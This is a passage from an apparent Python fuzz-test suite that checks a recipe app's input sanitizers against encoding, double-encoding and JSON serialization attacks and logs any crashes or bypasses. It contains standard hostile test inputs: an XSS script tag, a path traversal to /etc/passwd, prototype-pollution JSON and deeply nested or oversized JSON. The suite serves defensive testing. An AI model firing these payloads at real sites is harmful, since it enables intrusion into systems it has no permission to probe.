            except (ValidationError, TypeError):
                pass
            except Exception as e:
                log_vulnerability("TYPE_JUGGLE", "Crash on type juggle", (a, b), e)

    @given(st.from_type(type).flatmap(st.from_type))
    @MEDIUM_SETTINGS
    def test_random_types(self, value):
        """Fuzz with random Python types."""
        try:
            if isinstance(value, str):
                sanitize_text(value)
            elif isinstance(value, dict):
                validate_recipe_data(value)
            elif isinstance(value, list):
                validate_ingredients_list(value)
        except (ValidationError, TypeError, AttributeError):
            pass
        except Exception as e:
            log_vulnerability("RANDOM_TYPE", "Crash on random type", type(value).__name__, e)


# =============================================================================
# ENCODING ATTACKS - KITCHEN SINK
# =============================================================================


class TestKitchenSinkEncoding:
    """Test all encoding-based attacks."""

    ENCODINGS = [
        "utf-8",
        "utf-16",
        "utf-16-le",
        "utf-16-be",
        "utf-32",
        "utf-32-le",
        "utf-32-be",
        "latin-1",
        "iso-8859-1",
        "iso-8859-15",
        "cp1252",
        "cp437",
        "cp850",
        "ascii",
        "big5",
        "gb2312",
        "gbk",
        "gb18030",
        "euc-jp",
        "euc-kr",
        "shift_jis",
        "koi8-r",
        "koi8-u",
    ]

    def test_encoding_round_trips(self):
        """Test encoding round-trip attacks."""
        test_strings = [
            "<script>alert(1)</script>",
            "../../../etc/passwd",
            "\x00evil",
            "normal text",
        ]
        for s in test_strings:
            for enc in self.ENCODINGS:
                try:
                    encoded = s.encode(enc, errors="replace")
                    decoded = encoded.decode(enc, errors="replace")
                    result = sanitize_text(decoded)
                    if "<script" in result.lower():
                        log_vulnerability("ENCODING_BYPASS", f"XSS via {enc}", s, None)
                except (UnicodeError, ValidationError):
                    pass
                except Exception as e:
                    log_vulnerability("ENCODING", f"Crash on {enc}", s, e)

    def test_double_encoding(self):
        """Test double encoding attacks."""
        payloads = [
            ("%253Cscript%253E", "<script>"),  # Double URL encoded
            ("&#x25;3C", "<"),  # Mixed HTML entity + URL
            ("%26lt%3B", "<"),  # URL encoded HTML entity
        ]
        for payload, expected in payloads:
            try:
                result = sanitize_text(payload)
                assert expected not in result.lower()
            except ValidationError:
                pass

    @given(st.binary(max_size=10000))
    @HEAVY_SETTINGS
    def test_all_encodings_fuzz(self, data):
        """Fuzz all encodings with random binary data."""
        for enc in self.ENCODINGS:
            try:
                decoded = data.decode(enc, errors="replace")
                result = sanitize_text(decoded, max_length=10000)
                assert isinstance(result, str)
            except (UnicodeError, ValidationError):
                pass
            except Exception as e:
                log_vulnerability("ENCODING_FUZZ", f"Crash on {enc}", data[:20], e)


# =============================================================================
# SERIALIZATION ATTACKS - KITCHEN SINK
# =============================================================================


class TestKitchenSinkSerialization:
    """Test serialization-based attacks."""

    def test_json_edge_cases(self):
        """Test JSON edge cases."""
        json_payloads = [
            '{"__proto__": {"admin": true}}',
            '{"constructor": {"prototype": {}}}',
            '{"a": 1e999}',
            '{"a": ' + "1" * 10000 + "}",
            '{"a": "' + "x" * 100000 + '"}',
            '["' + "a" * 10000 + '"]',
            "[" * 1000 + "1" + "]" * 1000,
            '{"a": {"b": {"c": ' * 100 + "1" + "}}}" * 100,
        ]
        for payload in json_payloads:
            try:
                data = json.loads(payload)
                if isinstance(data, dict):
                    validate_recipe_data(data)
            except (json.JSONDecodeError, ValidationError, RecursionError):
                pass
            except Exception as e:
                log_vulnerability("JSON", "Crash on JSON", payload[:50], e)

    @given(
        st.recursive(
            st.none()
            | st.booleans()
            | st.integers()
            | st.floats(allow_nan=False)
            | st.text(max_size=100),
            lambda children: st.lists(children, max_size=20)
            | st.dictionaries(st.text(max_size=20), children, max_size=10),
            max_leaves=1000,
        )
    )
    @HEAVY_SETTINGS
    def test_json_round_trip(self, data):
        """Test JSON round-trip with arbitrary data."""
        try:
            json_str = json.dumps(data)
            parsed = json.loads(json_str)
            if isinstance(parsed, dict):
                validate_recipe_data(parsed)
        except (TypeError, ValueError, ValidationError, RecursionError):
            pass
        except Exception as e:
            log_vulnerability("JSON_ROUNDTRIP", "Crash on JSON round-trip", type(data).__name__, e)
            raise


# =============================================================================
# SUMMARY TEST - RUN EVERYTHING
# =============================================================================


class TestKitchenSinkSummary:
    """Summary test that runs through all payload categories."""

    def test_final_summary(self):
        """Print summary of all vulnerabilities found."""
        if VULN_LOG.exists():
            with open(VULN_LOG) as f:
                content = f.read()
            vuln_count = content.count("VULNERABILITY FOUND")
            if vuln_count > 0:
                print(f"\n\n{'=' * 80}")
                print(f"VULNERABILITIES FOUND: {vuln_count}")
                print(f"See: {VULN_LOG}")
                print(f"{'=' * 80}\n")
                print(content[-5000:])  # Print last 5000 chars
            else:
                print("\nNo vulnerabilities logged.")
        else:
            print("\nNo vulnerability log file created - all tests passed cleanly!")
